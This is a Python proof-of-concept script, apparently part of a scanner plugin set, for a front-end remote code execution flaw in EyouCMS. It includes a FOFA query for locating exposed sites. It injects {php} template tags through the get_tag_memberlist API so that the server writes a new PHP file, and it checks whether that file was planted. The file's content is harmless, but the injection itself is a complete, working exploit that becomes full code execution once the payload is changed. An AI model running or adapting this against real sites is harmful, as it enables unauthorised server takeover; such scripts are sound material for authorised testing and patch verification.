#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import requests.packages.urllib3
import base64
import json
from Config.config_requests import ua
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='EyouCMS_qiantai_rce'
AUTHOR="境心"
REMARK='易优CMS前台RCE'
FOFA_RULE='app="eyoucms"'
######################################################

def creat_payload():
    payload_tmp1 = '''<?php echo "this is a friendly test, Please check and repair upload vulnerabilities."?>'''
    payload_tmp1_base64 = base64.b64encode(payload_tmp1.encode('utf-8'))
    payload_tmp2 = {
        "{php}123{/php}": "{php}file_put_contents('./testtest.php',base64_decode(" + str(
            payload_tmp1_base64) + "));{/php}"
    }
    payload = base64.b64encode(json.dumps(payload_tmp2).encode('utf-8'))
    return payload

def poc(target):
    result = {}
    url = target + "/?m=api&c=ajax&a=get_tag_memberlist"
    headers = {
        "User-Agent" : ua,
        "X-Requested-With": "XMLHttpRequest",
        "Content-type": "application/x-www-form-urlencoded" # 手工必须要有，脚本可以不用
    }
    data = {
        "attarray" : creat_payload(),
        "htmlcode" : "testtest"
    }
    res = requests.post(url, data=data, headers=headers, verify=False, timeout=5)
    if "this is a friendly test" in res.text:
        result['message'] = "存在eyoucms前台RCE漏洞"
        result['poc_url'] = target+"/testtest.php"
        return result

if __name__ == '__main__':
    # poc调用
    poc("http://127.0.0.1/EyouCMS-V1.4.0-UTF8-SP2/index.php/")
